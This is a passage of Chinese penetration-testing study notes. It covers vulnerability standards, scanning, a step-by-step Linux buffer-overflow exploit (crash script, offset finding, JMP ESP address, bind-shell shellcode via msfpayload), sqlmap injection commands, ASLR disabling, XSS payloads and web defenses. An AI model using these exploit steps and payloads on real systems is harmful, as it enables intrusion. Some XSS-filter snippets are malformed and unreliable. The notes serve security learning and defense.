<li>简单网络管理协议</li>
<li>监控网络设备的CPU 内存 网络带宽 等</li>
<li>默认是public，容易被渗透<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h2><p>CVSS：通用漏洞评分系统。（一种工业标准）</p>
<ul>
<li>版本 V3.1</li>
<li>类别<ul>
<li>Basic - 基本</li>
<li>Temporal - 依赖时间因素</li>
<li>Enviromental - 利用环境</li>
</ul>
</li>
</ul>
<p>CVE 管理组织，负责漏洞编号。<br>各个厂商也会自己编号。</p>
<p>OVAL 开放漏洞描述语言：XML语言。</p>
<ul>
<li>描述漏洞，可以被扫描器存储。</li>
</ul>
<p>CCE 描述软件缺陷的标准化格式。</p>
<p>CPE 软件，硬件，其他设备 命名编号格式。</p>
<p>CWE 通用弱点描述，只做类型分类。</p>
<p>SCAP 集合多种安全标准的框架，包含上述标准。</p>
<ul>
<li>便于管理，测量，量化。</li>
<li>将复杂系统配置自动化。</li>
</ul>
<p><a href="https://nvd.nist.gov/">NVD</a> 美国国家漏洞库。</p>
<h3 id="手工查询"><a href="#手工查询" class="headerlink" title="手工查询"></a>手工查询</h3><p>漏洞库：<a href="https://www.exploit-db.com/">地址1</a>，由Kali维护。<a href="https://www.rapid7.com/">地址2</a>，由Rapid7维护。</p>
<p>或本地库搜索</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">searchsploit tomcat</span><br><span class="line"><span class="comment"># /usr/share/exploitdb/exploits/</span></span><br><span class="line"><span class="comment"># 攻击脚本地址</span></span><br><span class="line"><span class="comment"># /usr/share/exploitdb/shellcodes</span></span><br></pre></td></tr></table></figure>

<p>或工具sandi-gui </p>
<h3 id="弱点扫描器"><a href="#弱点扫描器" class="headerlink" title="弱点扫描器"></a>弱点扫描器</h3><p>主动扫描：</p>
<ul>
<li>有身份验证</li>
<li>无身份验证</li>
</ul>
<p>被动扫描：</p>
<ul>
<li>镜像抓包</li>
<li>其他来源输入</li>
</ul>
<p>基于Agent扫描：</p>
<ul>
<li>应用场景受限</li>
</ul>
<p>Nmap</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 脚本位置</span></span><br><span class="line"><span class="comment"># /usr/share/nmap/scripts</span></span><br></pre></td></tr></table></figure>

<h2 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" title="缓冲区溢出"></a>缓冲区溢出</h2><p>漏洞来源：数据与程序的边界不清。</p>
<p>例如：Shell脚本。</p>
<p>挖掘漏洞：</p>
<ul>
<li>源码审计</li>
<li>逆向工程</li>
<li>模糊测试：利用调试工具，发送任意包注入</li>
</ul>
<h3 id="Linux-缓冲区溢出"><a href="#Linux-缓冲区溢出" class="headerlink" title="Linux 缓冲区溢出"></a>Linux 缓冲区溢出</h3><p>调试工具：EDB</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">edb --run target</span><br></pre></td></tr></table></figure>

<p>探测溢出：</p>
<ol>
<li>需要关注EIP。</li>
<li>尝试不同长度的数据填充，直到溢出，改变EIP。一旦发生溢出，EDB会报错。</li>
<li>如果EIP被修改为填充数据，则表示可以利用。如果被修改为其他数据，则无法利用。</li>
</ol>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 探测脚本</span></span><br><span class="line"><span class="keyword">import</span> socket </span><br><span class="line">host = <span class="string">&#x27;127.0.0.1&#x27;</span></span><br><span class="line">crash = <span class="string">&#x27;\x41&#x27;</span> * <span class="number">4379</span></span><br><span class="line"><span class="comment"># \x11 设备1调用的指令代号：传输开始  \x90 NOP  \x00</span></span><br><span class="line">buffer = <span class="string">&#x27;\x11(setup sound&#x27;</span> + crash + <span class="string">&#x27;\x90\x00#&#x27;</span></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Start to send&quot;</span>)</span><br><span class="line">s.connect((host, <span class="number">13327</span>))</span><br><span class="line">data = s.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line">s.send(buffer)</span><br><span class="line">s.close()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;End&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>寻找溢出位置：</p>
<ol>
<li>使用唯一的填充字符串，填充缓冲区。</li>
<li>通过查看EIP被修改的数据定位溢出位置。</li>
</ol>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 唯一字符串生成</span></span><br><span class="line"><span class="built_in">cd</span> /usr/share/metasploit-framework/tools</span><br><span class="line">./pattern_create.rb 4379 <span class="comment"># 长度为 4379</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 精确匹配偏移量</span></span><br><span class="line">./pattern_offset.rb 72712791</span><br><span class="line"><span class="comment"># 返回 offset 4368, 表示 4369 - 4372 这4个被覆盖</span></span><br></pre></td></tr></table></figure>

<p>构造攻击字符串：</p>
<ul>
<li>一般情况下，C 部分（ESP）用来构造Shell Code。</li>
<li>如果不行，则先进入 C 部分，再跳转到 A 部分，执行Shell Code。<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#         A               B          C</span></span><br><span class="line">crash = <span class="string">&#x27;\x41&#x27;</span> * <span class="number">4368</span> + <span class="string">&#x27;\x42&#x27;</span> * <span class="number">7</span> + <span class="string">&#x27;\x43&#x27;</span> * <span class="number">7</span></span><br></pre></td></tr></table></figure></li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 构造 汇编指令</span></span><br><span class="line"><span class="built_in">cd</span> /usr/share/metasploit-framework/tools</span><br><span class="line">./nasm_shell.rb</span><br><span class="line"><span class="comment"># 当函数返回时，返回地址已被修改，新的地址被读入EIP中，函数返回值存放在EAX中</span></span><br><span class="line"><span class="comment"># 这个函数的返回值就是 crash 字符串</span></span><br><span class="line">&gt; add eax, 12</span><br><span class="line">&gt; jmp eax</span><br><span class="line"><span class="comment"># 返回 83 c0 0c ff e0 90 90 </span></span><br></pre></td></tr></table></figure>

<p>使用<code>EDB</code>插件<code>Opcode Search</code>搜索<code>ESP-&gt;EIP</code>得到<code>JMP ESP</code>指令的地址(0x08134587)。</p>
<p>查找坏字符：不能出现在Shell Code中</p>
<ol>
<li>**</li>
</ol>
<p>编写Shell Code</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -b 坏字符表</span></span><br><span class="line">msfpayload linux/x86/shell_bind_tcp LPORT=4444 R | msfencode - b <span class="string">&quot;\x00\x20\x09\x0D&quot;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">crash = shell_code + <span class="string">&#x27;\x41&#x27;</span> * (<span class="number">4368</span> - <span class="built_in">len</span>(shell_code)) </span><br><span class="line">      + <span class="string">&#x27;\x87\x45\x13\x08&#x27;</span> </span><br><span class="line">      + <span class="string">&#x27;\x83\xc0\x0c\xff\xe0\x90\x90&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="Web-渗透"><a href="#Web-渗透" class="headerlink" title="Web 渗透"></a>Web 渗透</h2><h3 id="Http"><a href="#Http" class="headerlink" title="Http"></a>Http</h3><p>重要的头：</p>
<ul>
<li>Set-Cookie - 发送给客户端 SessionId</li>
<li>Content-Length - 响应体的字节长度</li>
<li>Location - 重定向到另一个页面，用于识别身份后跳转</li>
<li>Cookie </li>
<li>Referer - 发起请求之前，用户位于哪个页面</li>
<li>Host - 发起请求之前，用户位于的站点</li>
</ul>
<h3 id="侦察"><a href="#侦察" class="headerlink" title="侦察"></a>侦察</h3><p>Httrack：用于克隆目标网站，以减少与目标系统的交互。克隆之后，搜索敏感的字符串：电话，邮件等。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">httrack</span><br></pre></td></tr></table></figure>

<p>hidemyass：免费HTTP代理，可能会有黑客。</p>
<h3 id="扫描"><a href="#扫描" class="headerlink" title="扫描"></a>扫描</h3><ul>
<li>Nikto</li>
<li>Vega</li>
<li>Skipfish</li>
<li>W3af</li>
<li>Arachni</li>
<li>Owasp-zap</li>
</ul>
<p>Nikto：可以扫描</p>
<ul>
<li>Web服务器版本</li>
<li>存在安全隐患的文件</li>
<li>服务器配置漏洞</li>
<li>Web 应用程序上的安全隐患</li>
</ul>
<p>同时会扫描所有页面。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">nikto -update  <span class="comment"># 升级数据库</span></span><br><span class="line">nikto -list-plugin <span class="comment"># 插件</span></span><br></pre></td></tr></table></figure>

<h3 id="手动挖洞"><a href="#手动挖洞" class="headerlink" title="手动挖洞"></a>手动挖洞</h3><h2 id="默认开通某些服务，可能被攻击：-phpMyAdmin-setup-Ubuntu-默认安装-PHP5-cgi"><a href="#默认开通某些服务，可能被攻击：-phpMyAdmin-setup-Ubuntu-默认安装-PHP5-cgi" class="headerlink" title="默认开通某些服务，可能被攻击：- phpMyAdmin&#x2F;setup- Ubuntu 默认安装 PHP5-cgi"></a>默认开通某些服务，可能被攻击：<br>- phpMyAdmin&#x2F;setup<br>- Ubuntu 默认安装 PHP5-cgi</h2><h3 id="SQL-自动注入"><a href="#SQL-自动注入" class="headerlink" title="SQL 自动注入"></a>SQL 自动注入</h3><p>SQLMap：</p>
<p>不仅可以发现SQL漏洞，还能检查跨站脚本漏洞。</p>
<p>五种检测技术</p>
<ul>
<li>基于布尔的盲注</li>
<li>基于时间的盲注</li>
<li>基于错误的检测</li>
<li>基于Union的检测：适用于循环</li>
<li>基于堆叠查询的检测</li>
</ul>
<p>GET 注入：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -u url   -p 检测的参数   -f 检查服务器指纹信息</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://...&quot;</span> -p username -f  </span><br><span class="line"><span class="comment"># --users  管理员账号</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://...&quot;</span> -p username --<span class="built_in">users</span></span><br><span class="line"><span class="comment"># --banner Banner信息  </span></span><br><span class="line"><span class="comment"># --dbs 查询所有的库</span></span><br><span class="line"><span class="comment"># --schema 元数据库</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -a 所有信息</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://...&quot;</span> -p username -a</span><br><span class="line"></span><br><span class="line"><span class="comment"># -m 检查URL List</span></span><br><span class="line">sqlmap -m url_list.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># -g 扫描 Google 搜索结果</span></span><br><span class="line">sqlmap -g <span class="string">&quot;inurl:\&quot;.php?id=1\&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<p>POST 注入：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 启动 burpsuit 作为代理，用浏览器连接代理，准备抓包</span></span><br><span class="line"><span class="comment"># 抓取HTTP请求，保存到 request.txt </span></span><br><span class="line">sqlmap -r request.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动 burpsuit 作为代理，用浏览器连接代理，准备抓包</span></span><br><span class="line"><span class="comment"># 在 burpsuit 中配置 Options，Logging 中勾选 Proxy Requests</span></span><br><span class="line"><span class="comment"># 结果保存到 用户目录下 log.txt</span></span><br><span class="line">sqlmap -l log.txt</span><br></pre></td></tr></table></figure>

<p>可以直接连接数据库，其他查询方式一样：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sqlmap -d <span class="string">&quot;mysql://root@xx.xx.xx.xx:3306/database_name&quot;</span> -f --<span class="built_in">users</span></span><br></pre></td></tr></table></figure>

<p>Request：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#</span></span><br></pre></td></tr></table></figure>


<p>其他功能：</p>
<ul>
<li>可以进行字典破解，来破解密码。</li>
</ul>
<h2 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h2><h3 id="TurnKey"><a href="#TurnKey" class="headerlink" title="TurnKey"></a>TurnKey</h3><p><a href="https://www.turnkeylinux.org/">地址</a><br>有各种应用构成的虚拟机可供测试。</p>
<h3 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h3><p><a href="https://www.metasploit.com/">Metasploit</a><br><a href="https://sourceforge.net/projects/metasploitable/">Metasploitable 2</a><br>集成各种渗透测试应用。</p>
<p>Metasploitable 2 中需要配置一下：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">vim /var/www/mutillidae/config.inc</span><br><span class="line"><span class="comment"># 修改 dbname</span></span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&#x27;owasp10&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="Vulhub"><a href="#Vulhub" class="headerlink" title="Vulhub"></a>Vulhub</h3><p><a href="https://vulhub.org/">地址</a><br>基于docker和docker-compose的漏洞环境集合。</p>
<h3 id="模拟防火墙"><a href="#模拟防火墙" class="headerlink" title="模拟防火墙"></a>模拟防火墙</h3><p><a href="http://m0n0.ch/wall/downloads.php">地址</a><br>用于模拟真实网络。</p>
<h1 id="Linux-扫描与防御"><a href="#Linux-扫描与防御" class="headerlink" title="Linux 扫描与防御"></a>Linux 扫描与防御</h1><h2 id="主机扫描-1"><a href="#主机扫描-1" class="headerlink" title="主机扫描"></a>主机扫描</h2><h3 id="netstat-查看端口"><a href="#netstat-查看端口" class="headerlink" title="netstat 查看端口"></a>netstat 查看端口</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">-l <span class="comment"># 正在监听的端口</span></span><br><span class="line">-t <span class="comment"># TCP 协议</span></span><br><span class="line">-n <span class="comment"># 不解析主机名</span></span><br></pre></td></tr></table></figure>

<h3 id="禁用-ICMP-连接"><a href="#禁用-ICMP-连接" class="headerlink" title="禁用 ICMP 连接"></a>禁用 ICMP 连接</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sysctl -w net.ipv4.icmp_echo_ignore_all=1</span><br></pre></td></tr></table></figure>

<h3 id="TCP-Dump"><a href="#TCP-Dump" class="headerlink" title="TCP Dump"></a>TCP Dump</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">tcpdump -np -ieth0</span><br></pre></td></tr></table></figure>

<h3 id="fping-批量主机扫描工具（ICMP）"><a href="#fping-批量主机扫描工具（ICMP）" class="headerlink" title="fping 批量主机扫描工具（ICMP）"></a>fping 批量主机扫描工具（ICMP）</h3><p>作用：批量，并行发送，结果易懂。<br><a href="http://fping.org/">下载地址</a></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">man fping <span class="comment"># 查看帮助</span></span><br><span class="line">fping IP1 IP2</span><br><span class="line">-a <span class="comment"># 只显示存活的主机</span></span><br><span class="line">-u <span class="comment"># 只显示未存活的主机</span></span><br><span class="line">-g <span class="comment"># 主机段 </span></span><br><span class="line">-f <span class="comment"># 从文件读取</span></span><br></pre></td></tr></table></figure>

<h3 id="hping-批量主机扫描工具（TCP-IP）"><a href="#hping-批量主机扫描工具（TCP-IP）" class="headerlink" title="hping 批量主机扫描工具（TCP&#x2F;IP）"></a>hping 批量主机扫描工具（TCP&#x2F;IP）</h3><p>作用：探测TCP端口，模拟DDOS攻击。<br><a href="http://www.hping.org/">下载地址</a></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">hping -h <span class="comment"># 帮助</span></span><br><span class="line">-p port_num <span class="comment"># 端口探测</span></span><br><span class="line">-S <span class="comment"># 设置TCP模式下的 SYN 包</span></span><br><span class="line">-a <span class="comment"># 伪造IP地址</span></span><br></pre></td></tr></table></figure>

<h2 id="路由扫描"><a href="#路由扫描" class="headerlink" title="路由扫描"></a>路由扫描</h2><h3 id="Trace-Route"><a href="#Trace-Route" class="headerlink" title="Trace Route"></a>Trace Route</h3><p>让每一个路由返回一个ICMP包。</p>
<ul>
<li>Windows：发送 ICMP 包。</li>
<li>Linux：发送 UDP 包，端口号大于30000。</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">traceroute IP <span class="comment"># 默认 UDP</span></span><br><span class="line">-T <span class="comment"># 使用 TCP</span></span><br><span class="line">-p <span class="comment"># 使用 TCP 的端口号</span></span><br><span class="line">-I <span class="comment"># 使用 ICMP</span></span><br><span class="line">-n <span class="comment"># 延时时间</span></span><br></pre></td></tr></table></figure>

<h3 id="MTR"><a href="#MTR" class="headerlink" title="MTR"></a>MTR</h3><p>测试主机到每一个路由的连通性，实时。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">mtr IP</span><br></pre></td></tr></table></figure>

<h2 id="扫描服务"><a href="#扫描服务" class="headerlink" title="扫描服务"></a>扫描服务</h2><h3 id="NMAP"><a href="#NMAP" class="headerlink" title="NMAP"></a>NMAP</h3><p>批量扫描主机和服务</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">-P   <span class="comment"># ICMP ping 简单</span></span><br><span class="line">-sS  <span class="comment"># TCP SYN   不易检测，通用</span></span><br><span class="line">-sT  <span class="comment"># TCP 连接  真实</span></span><br><span class="line">-sU  <span class="comment"># UDP       可能穿透防火墙，会很慢：Linux限制单位时间内返回ICMP的次数</span></span><br><span class="line"></span><br><span class="line">nmap -sP 10.10.10.0/24 <span class="comment"># 得到存活的主机</span></span><br><span class="line">nmap -sS 10.10.10.12   <span class="comment"># 得到主机上存活的TCP服务（默认0-1024和特殊端口）</span></span><br><span class="line">nmap -sS -p 0-30000 10.10.10.12 <span class="comment"># 指定端口 </span></span><br></pre></td></tr></table></figure>

<h3 id="NCAT-1"><a href="#NCAT-1" class="headerlink" title="NCAT"></a>NCAT</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">-w <span class="comment"># 超时时间</span></span><br><span class="line">-z <span class="comment"># 输入输出模式</span></span><br><span class="line">-v <span class="comment"># 显示命令执行过程</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 默认 TCP</span></span><br><span class="line">nc -v -z -w2 10.10.10.12 1-50 <span class="comment"># 端口范围1-50</span></span><br><span class="line"><span class="comment"># UDP</span></span><br><span class="line">nc -v -u -z -w2 10.10.10.12 1-50</span><br></pre></td></tr></table></figure>

<h2 id="攻击防御"><a href="#攻击防御" class="headerlink" title="攻击防御"></a>攻击防御</h2><p>攻击者伪造源IP，发送SYN包，耗尽目标机器资源。<br>防御方式：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 方式1：设置重置次数，默认都是5次</span></span><br><span class="line">sysctl -w net.ipv4.tcp_synack_retries=3</span><br><span class="line">sysctl -w net.ipv4.tcp_syn_retries=3</span><br><span class="line"><span class="comment"># 方式2：设置SYN Cookies</span></span><br><span class="line">sysctl -w net.ipv4.tcp_syncookies=1</span><br><span class="line"><span class="comment"># 方式3：增大backlog队列（保存SYN请求的缓冲区）</span></span><br><span class="line">sysctl -w net.ipv4.tcp_max_syn_backlog=2048</span><br></pre></td></tr></table></figure>

<p>关闭ICMP：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sysctl -w net.ipv4.icmp_echo_ignore_all=1</span><br></pre></td></tr></table></figure>

<p>设置IP Tables防止扫描。</p>
<h2 id="IP-Tables"><a href="#IP-Tables" class="headerlink" title="IP Tables"></a>IP Tables</h2><h1 id="内存包含机制"><a href="#内存包含机制" class="headerlink" title="内存包含机制"></a>内存包含机制</h1><h2 id="ASLR"><a href="#ASLR" class="headerlink" title="ASLR"></a>ASLR</h2><p>ASLR（Address space layout randomization）是一种针对缓冲区溢出的安全保护技术，通过对堆、栈、共享库映射等线性区布局的随机化，通过增加攻击者预测目的地址的难度，防止攻击者直接定位攻击代码位置，达到阻止溢出攻击的目的。</p>
<h3 id="Windows-1"><a href="#Windows-1" class="headerlink" title="Windows"></a>Windows</h3><p>关闭方法：打开<code>Windows Defender</code>，<code>应用和浏览器控制</code>，<code>Exploit Protection</code>，先关闭<code>ASLR</code>，再关闭其余两项。之后重启。</p>
<h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><p>Ubuntu 关闭方法：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看当前配置</span></span><br><span class="line"><span class="comment"># 0 关闭 1 半随机 2 全随机（包含HEAP）</span></span><br><span class="line"><span class="built_in">cat</span> /proc/sys/kernel/randomize_va_space </span><br><span class="line"><span class="comment"># 查看地址空间随机效果</span></span><br><span class="line">ldd /bin/bash </span><br><span class="line"></span><br><span class="line"><span class="comment"># 临时关闭 ASLR</span></span><br><span class="line">sysctl -w kernel.randomize_va_space=0</span><br><span class="line"></span><br><span class="line"><span class="comment"># 永久关闭 ASLR</span></span><br><span class="line">vim /etc/sysctl.conf</span><br><span class="line"><span class="comment"># 增加</span></span><br><span class="line">kernel.randomize_va_space=0</span><br><span class="line"></span><br><span class="line"><span class="comment"># GDB 下关闭 ASLR</span></span><br><span class="line"><span class="built_in">set</span> disable-randomization on   <span class="comment"># 关闭 ASLR</span></span><br><span class="line"><span class="built_in">set</span> disable-randomization off  <span class="comment"># 开启 ASLR</span></span><br><span class="line">show disable-randomization     <span class="comment"># 查看</span></span><br></pre></td></tr></table></figure>

<h2 id="DEP"><a href="#DEP" class="headerlink" title="DEP"></a>DEP</h2><h2 id="堆栈-Cookies"><a href="#堆栈-Cookies" class="headerlink" title="堆栈 Cookies"></a>堆栈 Cookies</h2><h2 id="堆栈粉碎"><a href="#堆栈粉碎" class="headerlink" title="堆栈粉碎"></a>堆栈粉碎</h2><h1 id="Web-漏洞"><a href="#Web-漏洞" class="headerlink" title="Web 漏洞"></a>Web 漏洞</h1><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>跨站脚本攻击：通过在网站中提交含可执行代码的内容，被其他用户访问的时候执行。</p>
<p>类型包括：<br>反射型：URL带注入。可以用短网址隐藏。<br>存储型：存到数据库。其他用户访问时被攻击。</p>
<h3 id="注入点"><a href="#注入点" class="headerlink" title="注入点"></a>注入点</h3><p>HTML 结点内容：用户输入的动态信息。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>HTML 属性：由用户输入。<br>用户输入了 <code>1&quot; onerror=&quot;alert(1)</code></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;1&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(1)&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>

<p>JavaScript 代码。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<p>富文本。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="拦截"><a href="#拦截" class="headerlink" title="拦截"></a>拦截</h3><p>设置Header：关闭可能的XSS攻击（浏览器自带功能）。只拦截反射型，且只拦截HTML内容和属性种的。：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">ctx.<span class="title function_">set</span>(<span class="string">&#x27;X-XSS-Protection&#x27;</span>, <span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>转义：将<code>&lt;, &gt;, &quot;, &#39;, ...</code>替换为HTML实体。可以在上传时替换，也可以在显示时替换。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">str = str.<span class="title function_">replace</span>(<span class="regexp">/&lt;/g</span>, <span class="string">&#x27;&amp;lt;&#x27;</span>);</span><br><span class="line">str = str.<span class="title function_">replace</span>(<span class="regexp">/&gt;/g</span>, <span class="string">&#x27;&amp;gt;&#x27;</span>);</span><br><span class="line">str = str.<span class="title function_">replace</span>(<span class="regexp">/&quot;/g</span>, <span class="string">&#x27;&amp;quto;&#x27;</span>);</span><br><span class="line">str = str.<span class="title function_">replace</span>(<span class="regexp">/&#x27;/g</span>, <span class="string">&#x27;&amp;#39;&#x27;</span>);</span><br><span class="line">str = str.<span class="title function_">replace</span>(<span class="regexp">/ /g</span>, <span class="string">&#x27;&amp;#32;&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>同时转义Javascript内部的代码：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">str = str.<span class="title function_">replace</span>(<span class="regexp">/\\/g</span>, <span class="string">&#x27;\\\\&#x27;</span>);  <span class="comment">// 放在最前</span></span><br><span class="line">str = str.<span class="title function_">replace</span>(<span class="regexp">/&quot;/g</span>, <span class="string">&#x27;\\&quot;&#x27;</span>);</span><br><span class="line">str = str.<span class="title function_">replace</span>(<span class="regexp">/&#x27;/g</span>, <span class="string">&#x27;\\&#x27;</span><span class="string">&#x27;);</span></span><br></pre></td></tr></table></figure>

<p>Javascript内部的代码最保险的方法是使用Encode：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">JSON</span>.<span class="title function_">stringify</span>();</span><br></pre></td></tr></table></figure>

<p>富文本的过滤：富文本最复杂，使用黑名单和白名单。一般在输入时过滤。<br>黑名单方法：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// &lt;script&gt;</span></span><br><span class="line">str = str.<span class="title function_">replace</span>(<span class="regexp">/&lt;\s*\/?script\s*/</span>&gt;);  </span><br><span class="line"><span class="comment">// &lt;a href=&quot;javascript:alert(1)&quot;&gt;123&lt;/a&gt;</span></span><br><span class="line">str = str.<span class="title function_">replace</span>(<span class="regexp">/javascript:[^&#x27;&quot;]*/</span>&gt;);</span><br><span class="line"><span class="comment">// &lt;img src=&quot;123&quot; onerror=&quot;alert(1)&quot;&gt;  </span></span><br><span class="line">str = str.<span class="title function_">replace</span>(<span class="regexp">/onerror\s*=\s*/</span>&gt;);</span><br><span class="line"><span class="comment">// 其他形式 ...</span></span><br></pre></td></tr></table></figure>

<p>白名单方法：先解析HTML，再将必要的标签输出</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> cheerio = <span class="built_in">require</span>(<span class="string">&#x27;cheerio&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> $ = cheerio.<span class="title function_">load</span>(HTML_To_Filt)</span><br><span class="line"><span class="keyword">var</span> white_list = &#123;</span><br><span class="line">    <span class="string">&#x27;img&#x27;</span>: [<span class="string">&#x27;src&#x27;</span>]</span><br><span class="line">&#125;</span><br><span class="line">$(<span class="string">&#x27;*&#x27;</span>).<span class="title function_">each</span>(<span class="keyword">function</span>(<span class="params">index, elem</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!white_list[elem.<span class="property">name</span>])&#123;</span><br><span class="line">        $(elem).<span class="title function_">remove</span>();</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> attr <span class="keyword">in</span> elem.<span class="property">attribs</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(white_list[elem.<span class="property">name</span>].<span class="title function_">indexOf</span>(attr) === -<span class="number">1</span>)&#123;</span><br><span class="line">            $(elem).<span class="title function_">attr</span>(attr, <span class="literal">null</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line">$.<span class="title function_">html</span>()</span><br></pre></td></tr></table></figure>

<h3 id="XSS-拦截集成库"><a href="#XSS-拦截集成库" class="headerlink" title="XSS 拦截集成库"></a>XSS 拦截集成库</h3><p><a href="https://github.com/leizongmin/js-xss.git">Github 地址</a></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> xss = <span class="built_in">require</span>(<span class="string">&#x27;xss&#x27;</span>)</span><br><span class="line"><span class="keyword">var</span> html = <span class="title function_">xss</span>(<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="CSP-内容安全策略"><a href="#CSP-内容安全策略" class="headerlink" title="CSP 内容安全策略"></a>CSP 内容安全策略</h3><p>HTTP头，用于指定哪些可以执行。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span><span class="punctuation">: </span>default-src &#x27;self&#x27; http://www.com; content-src &#x27;none&#x27;; script-src http://www.com</span><br></pre></td></tr></table></figure>

<h2 id="CSRF-跨站请求伪造"><a href="#CSRF-跨站请求伪造" class="headerlink" title="CSRF 跨站请求伪造"></a>CSRF 跨站请求伪造</h2><p>用户打开某一个第三方网站，则第三方网站伪装成用户在某网站进行操作。甚至可以用来制造网络蠕虫。</p>
<p>攻击步骤：</p>
<ol>
<li>用户登录A网站</li>
<li>A网站确认身份</li>
<li>B网站前端向A网站发起请求，附带身份</li>
</ol>
<p>危害：</p>
<ul>
<li>冒用用户的身份</li>
<li>用户不知情</li>
<li>盗取用户资金</li>
</ul>
<h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><p>禁止第三方网站前端带Cookies访问：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>samesite=strict</span><br><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>samesite=lax</span><br></pre></td></tr></table></figure>
<p>但该方法只有Chrome和苹果浏览器支持。</p>
<p>使用验证码和Token：</p>
